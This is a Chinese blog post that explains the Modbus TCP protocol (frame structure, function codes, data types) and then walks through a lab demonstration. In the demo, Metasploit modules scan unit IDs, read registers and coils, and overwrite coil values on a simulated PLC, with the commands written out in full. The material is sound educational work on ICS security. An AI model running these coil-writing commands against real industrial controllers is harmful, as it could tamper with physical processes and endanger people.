<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/WE3JLl3E7IBEdo94GhQY0g)

最近学习了工控协议 Modbus 的一些相关知识，秉承着吹捧共同进步的原则，于是乎有了这篇小记

首先简单介绍一下 Modbus 协议

**0X01 Modbus 协议简介  
**

Modbus 协议是一种已广泛应用于当今工业控制领域的通用通讯协议，Modbus 是 MODICON 公司（现为施耐德电气公司的一个品牌）最先倡导的一种软的通讯规约。  
通过此协议，控制器相互之间、或控制器经由网络 (如以太网) 可以和其它设备之间进行通信。Modbus 协议使用的是主从通讯技术，即由主设备主动查询和操作从设备。

一般将主控设备方所使用的协议称为 Modbus Master，从设备方使用的协议称为 Modbus Slave。在我们 IT 术语里，其实就是 server 响应请求与 client 发送请求，正如大家所预料的，Modbus 也是一个请求 / 应答协议。

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB50dDA0ptZcMnBSjXSOTDzQjAHoata3yphgfRicEqnBRFxFxIvOXMne6thrU9StruXuu4JtIKf8JZmg/640?wx_fmt=png)

参考人家的图画的，画图水平有限，大家勿喷  

典型的主设备包括工控机和工业控制器等; 典型的从设备如 PLC 可编程控制器等。Modbus 通讯物理接口可以选用串口 (包括 RS232 和 RS485)，也可以选择以太网口。其通信遵循以下的过程：  

```
主设备向从设备发送请求
从设备分析并处理主设备的请求，然后向主设备发送结果
如果出现任何差错，从设备将返回一个异常功能码
```

  
其实通过上图就可以发现，攻击者可访问 OT 网络，拦截发往目标 PLC 的 Modbus 流量，一旦获取明文传输的 sesseion key，攻击者可以通过简单地发送不同功能码的报文，就可以达到恶意操作设备的目的

**0X02 Modbus 协议的特点**  

(1) 标准、开放，用户可以免费、放心地使用 Modbus 协议，不需要交纳许可证费，也不会侵犯知识产权。目前，支持 Modbus 的厂家超过 400 家，支持 Modbus 的产品超过 600 种。  
(2) Modbus 可以支持多种电气接口，如 RS-232、RS-485 等，还可以在各种介质上传送，如双绞线、光纤、无线等。  
(3) Modbus 的帧格式简单、紧凑，通俗易懂。

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB50dDA0ptZcMnBSjXSOTDzQj0nbH5DSuhYJRdGpNl8BtSVdd4icM6iaoEHVx27b1NjmXRp5fJQiaGEiaMg/640?wx_fmt=png)

**0X03 Modbus 协议模型**

ModbusTCP 的数据帧可分为两部分：MBAP+PDU

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB50dDA0ptZcMnBSjXSOTDzQj703LfM1VF6e2Fj8xicw0RFmxxO36qib7IibqczMTHxASTAnGE2kw9LaBA/640?wx_fmt=png)

ADU：应用数据单元  
ModbusTCP 的数据帧可分为两部分：MBAP+PDU

MBAP：报文头

PDU：协议数据单元

在 TCP/IP 上使用一种专用报文头识别 MODBUS 应用数据单元。将这种报文头称为 MBAP 报文头（MODBUS 协议报文头为 7 个字节长）。  
用 MBAP 报文头中的单个字节单元标识符取代 MODBUS 串行链路上通常使用的 MODBUS 从地址域。这个单元标识符用于设备的通信，这些设备使用单个 IP 地址支持多个独立 Modbus 终端单元，例如：网桥、路由器和网关。  

MBAP 报文头组成表如下图所示  

<table cellspacing="0" border="1"><tbody><tr><td width="155" valign="top"><p>作用域<o:p></o:p></p></td><td width="110" valign="top"><p>长度<o:p></o:p></p></td><td width="586" valign="top"><p>描述<o:p></o:p></p></td></tr><tr><td width="155" valign="top"><p>事务元标识符<o:p></o:p></p></td><td width="110" valign="top"><p>2 字节<o:p></o:p></p></td><td width="586" valign="top"><p>MODBUS 请求 / 响应事务处理的识别码，主要用于在主站设备在接收到响应时能知道是哪个请求的响应<o:p></o:p></p></td></tr><tr><td width="155" valign="top"><p>协议标识符<o:p></o:p></p></td><td width="110" valign="top"><p>2 字节<o:p></o:p></p></td><td width="586" valign="top"><p>对于 MODBUS 协议来说，这里恒为 0<o:p></o:p></p></td></tr><tr><td width="155" valign="top"><p>长度<o:p></o:p></p></td><td width="110" valign="top"><p>2 字节<o:p></o:p></p></td><td width="586" valign="top"><p>以下字节的数量，也就是完整报文的字节数减去 6<o:p></o:p></p></td></tr><tr><td width="155" valign="top"><p>单元标识符<o:p></o:p></p></td><td width="110" valign="top"><p>1 字节<o:p></o:p></p></td><td width="586" valign="top"><p>串行链路或其它总线上连接的远程从站的识别码，也就是要访问的从站的标识号，因为只有一个字节，所以一个主站最多只能访问 256 个从站设备<o:p></o:p></p></td></tr></tbody></table>

PDU 用于验证报文涉及的所有 MODBUS 请求和响应，PDU 的组成为功能码 (一个字节) 和数据(n 个字节)

其中功能码为一个字节，modbus 定义的正常响应功能码如下：

<table cellspacing="0" border="1"><tbody><tr><td width="100" valign="top"><p>01<o:p></o:p></p></td><td width="536" valign="top"><p>读线圈 (coils) 状态，读取单个或多个<o:p></o:p></p></td></tr><tr><td width="100" valign="top"><p>02<o:p></o:p></p></td><td width="536" valign="top"><p>读离散输入 (discreteinputs) 状态，读取单个或多个<o:p></o:p></p></td></tr><tr><td width="100" valign="top"><p>03<o:p></o:p></p></td><td width="536" valign="top"><p>读保持寄存器 (holdingregisters)，读取单个或多个<o:p></o:p></p></td></tr><tr><td width="100" valign="top"><p>04<o:p></o:p></p></td><td width="536" valign="top"><p>读输入寄存器 (inputregisters)，读取单个或多个<o:p></o:p></p></td></tr><tr><td width="100" valign="top"><p>05<o:p></o:p></p></td><td width="536" valign="top"><p>写单个线圈 (coils) 状态，单个写入<o:p></o:p></p></td></tr><tr><td width="100" valign="top"><p>06<o:p></o:p></p></td><td width="536" valign="top"><p>写单个保持寄存器 (holdingregisters)，单个写入<o:p></o:p></p></td></tr><tr><td width="100" valign="top"><p>15<o:p></o:p></p></td><td width="536" valign="top"><p>写多个线圈 (coils)，多个写入<o:p></o:p></p></td></tr><tr><td width="100" valign="top"><p>16<o:p></o:p></p></td><td width="536" valign="top"><p>写多个保持寄存器 (holdingregisters)，多个写入<o:p></o:p></p></td></tr></tbody></table>

PDU 异常响应功能码如下

<table cellspacing="0" border="1"><tbody><tr><td width="64" valign="top"><p>01<o:p></o:p></p></td><td width="787" valign="top"><p>功能码不能被从机识别<o:p></o:p></p></td></tr><tr><td width="64" valign="top"><p>02<o:p></o:p></p></td><td width="787" valign="top"><p>从机的单元标识符不正确<o:p></o:p></p></td></tr><tr><td width="64" valign="top"><p>03<o:p></o:p></p></td><td width="787" valign="top"><p>值不被从机接受<o:p></o:p></p></td></tr><tr><td width="64" valign="top"><p>04<o:p></o:p></p></td><td width="787" valign="top"><p>当从机试图执行请求的操作时，发生了不可恢复的错误。<o:p></o:p></p></td></tr><tr><td width="64" valign="top"><p>05<o:p></o:p></p></td><td width="787" valign="top"><p>从机已接受请求并正在处理，但需要很长时间。返回此响应是为了防止在主机中发生超时错误。主站可以在下一个轮询程序中发出一个完整的消息，以确定处理是否完成。<o:p></o:p></p></td></tr><tr><td width="64" valign="top"><p>06<o:p></o:p></p></td><td width="787" valign="top"><p>从站正在处理长时间命令。Master 应该稍后重试。<o:p></o:p></p></td></tr><tr><td width="64" valign="top"><p>07<o:p></o:p></p></td><td width="787" valign="top"><p>从站不能执行程序功能。主站应该向从站请求诊断或错误信息。<o:p></o:p></p></td></tr><tr><td width="64" valign="top"><p>08<o:p></o:p></p></td><td width="787" valign="top"><p>从站在内存中检测到奇偶校验错误。主设备可以重试请求，但从设备上可能需要服务。<o:p></o:p></p></td></tr><tr><td width="64" valign="top"><p>10<o:p></o:p></p></td><td width="787" valign="top"><p>专门用于 Modbus 网关。表示配置错误的网关。<o:p></o:p></p></td></tr><tr><td width="64" valign="top"><p>11<o:p></o:p></p></td><td width="787" valign="top"><p>专用于 Modbus 网关的响应。当从站无法响应时发送。<o:p></o:p></p></td></tr></tbody></table>

**0X04 Modbus 数据类型**

<table cellspacing="0" border="1"><tbody><tr><td width="280" valign="top"><p>区块<o:p></o:p></p></td><td width="124" valign="top"><p>访问长度<o:p></o:p></p></td><td width="121" valign="top"><p>访问类型<o:p></o:p></p></td><td width="326" valign="top"><p>内容<o:p></o:p></p></td></tr><tr><td width="280" valign="top"><p>Discretes Input（离散输入）<o:p></o:p></p></td><td width="124" valign="top"><p>1 bit<o:p></o:p></p></td><td width="121" valign="top"><p>只读<o:p></o:p></p></td><td width="326" valign="top"><p>通过 IO 系统提供此类型数据<o:p></o:p></p></td></tr><tr><td width="280" valign="top"><p>Coils（线圈）<o:p></o:p></p></td><td width="124" valign="top"><p>1 bit<o:p></o:p></p></td><td width="121" valign="top"><p>读写<o:p></o:p></p></td><td width="326" valign="top"><p>通过应用程序改变此类型数据<o:p></o:p></p></td></tr><tr><td width="280" valign="top"><p>Input Registers（输入寄存器）<o:p></o:p></p></td><td width="124" valign="top"><p>16 bit<o:p></o:p></p></td><td width="121" valign="top"><p>只读<o:p></o:p></p></td><td width="326" valign="top"><p>通过 IO 系统提供此类型数据<o:p></o:p></p></td></tr><tr><td width="280" valign="top"><p>Holding Registers （保持寄存器）<o:p></o:p></p></td><td width="124" valign="top"><p>16 bit<o:p></o:p></p></td><td width="121" valign="top"><p>读写<o:p></o:p></p></td><td width="326" valign="top"><p>通过应用程序改变此类型数据<o:p></o:p></p></td></tr></tbody></table>

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB50dDA0ptZcMnBSjXSOTDzQj30w4xX4vMvHMTCysYcx5ibplBOwk3qT4Oh7eO0b6ibmtGrWvFTCAMNdg/640?wx_fmt=png)

比对一下中文翻译的

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB50dDA0ptZcMnBSjXSOTDzQjhS9wo6DQOLBJXegpzMhvgGYajdusiboxEhQEWykNPO6ibMH4GOO98qMg/640?wx_fmt=png)

由于笔者水平有限，所以 PDU 报文详情就不细说了，大家感兴趣的可以自行学习，功能的话其实就是读写功能，后续的实验会给大家演示如何使用 msf 进行线圈的读写操作

**0X05 Modbus 攻击演示**

上面讲解到，modbus 协议是易受中间人攻击的，在获取到明文的 session 之后是可以做到读写线圈操作的，而很多 PLC 设备其实就是通过线圈读写去执行动作，也就是说其实掌握了读写功能我们就控制了 PLC 设备  

而很难受的就是无论是 modbus 还是 S7 协议，他们都有一个共同的特点，就是缺乏足够的认证、加密机制。。。。。。

此次演示的环境为：

modbus 仿真软件，实验的 ip 地址为 192.168.50.178

攻击环境为 kali ，自带 msf，二者处于同一个网络环境

首先下载好仿真软件，该仿真软件是 jar 包，直接双击就可以运行

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB50dDA0ptZcMnBSjXSOTDzQjY7JP8jYNlAVjm2sJ3dT4UybkmF7pz1X7UibdgByPwHN57IVIU3ibrnDg/640?wx_fmt=png)

如图，添加两个 slave 端，序号为 1 和 2 即可，首先设置 1 号从站的寄存器

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB50dDA0ptZcMnBSjXSOTDzQj1buyHPFzHh7zkPga3nx5EG5wgiaUZGTulqKjpf3NCS0Gk7GRhhegptQ/640?wx_fmt=png)

而后设置 2 号从站的线圈，需要注意的是，线圈的值只能是 1 或 0

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB50dDA0ptZcMnBSjXSOTDzQjuD2iamSCHPyCh2qsic8S0yjtwU7k8LIcWrMRsXiaUf8163Ro57GicGkYQA/640?wx_fmt=png)

设置完毕后，打开 kali，使用 msf 即可

```
msfconsole
search modbus
use 3
```

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB50dDA0ptZcMnBSjXSOTDzQjOjXrCKYE6wBlBYYNfgdRnOiapWcIPniabufuicdmOZ67BkdsYEU6dsynw/640?wx_fmt=png)

modbus 仿真软件的默认端口也是 502，所以我们只需要设置 rhosts 地址以及 UNIT_ID_TO ，这个参数是指读取寄存器的个数，上面也提到，最多不能超过 256 个，我们这里设置成 10 就可以，读取 0-10 个

```
set UNIT_ID_TO 10
set rhosts 192.168.50.178
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB50dDA0ptZcMnBSjXSOTDzQj8sVXWHicHQdGibIbs04ws8Hfvxt8Z4kdBnA0yELsGnqhBG7JOZSuZH1A/640?wx_fmt=png)

可以看到，结果显示识别到了 1 和 2 号寄存器，我们可以继续读取该寄存器的内容

```
use auxiliary/scanner/scada/modbusclient  
set data_address 0 
set number 5 
set rhosts 192.168.50.178 
set unit_number 1
run
```

  
这里简单说一下，data_address 相当于仿真软件面板的地址 1，其实这个我搞的不是很懂，我尝试了更改其他的，但是就都读不出来了。。。

number 对应的是寄存器里有多少个，个数可以低于或等于寄存器实际的数量，若是寄存器实际数量低于 number 的值，那么就会报错

ILLEGAL DATA ADDRESS  

unit_number 对应的就是 salve 端的序号

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB50dDA0ptZcMnBSjXSOTDzQjBbfrOKc9fyz4Vkib8ev22pSgSGgia5AXpC43MGb7OMLnm8lEsh6loQ5A/640?wx_fmt=png)

我们此次的操作，wireshark 本地探测到的流量如下

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB50dDA0ptZcMnBSjXSOTDzQjBK8T55hoRYOevSpo7ZuXbJIlO0vfyWy81sxVicg4aeuwicanVtDfVQkQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB50dDA0ptZcMnBSjXSOTDzQj9h3gTia6YF3hxz4JzCB3GEEaKBMVNVyRwP4Pa5neiaBalXxqEQ2uHWzA/640?wx_fmt=png)

读线圈也是一样

```
use auxiliary/scanner/scada/modbusclient 
set action READ_COILS  
set data_address 0 
set number 10 
set rhosts 192.168.50.178 
set unit_number 2 
run  
```

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB50dDA0ptZcMnBSjXSOTDzQj24fZ05lNK55YakOdgT6Bpe5essiaqSCacPd99loR30jToICn9uQZsiaA/640?wx_fmt=png)

接下来我们可以尝试更改线圈的值

```
use auxiliary/scanner/scada/modbusclient 
set action WRITE_COILS 
set number 10
set unit_number 2
set data_address 0
set rhosts 192.168.50.178 
set data_coils 1010101010
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB50dDA0ptZcMnBSjXSOTDzQjC63tZxmBGcpYgNcVE0Vt9BUQ2k5ZTamWJulHp8ZiaKyTiahkPpZAxF6w/640?wx_fmt=png)

线圈的值成功被修改

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB50dDA0ptZcMnBSjXSOTDzQjYR7S7kH9QIBwpbiaZGa3MqoIfFE6zLarCHpSUtfmGM9ib0EQ1nXoy59g/640?wx_fmt=png)

小结：

今天分享的内容就到这了，没小结，modbus 仿真软件请在公众号回复

modbus 仿真软件即可获取，请大家获取的同时帮转一下，或者点个赞，蟹蟹各位铁汁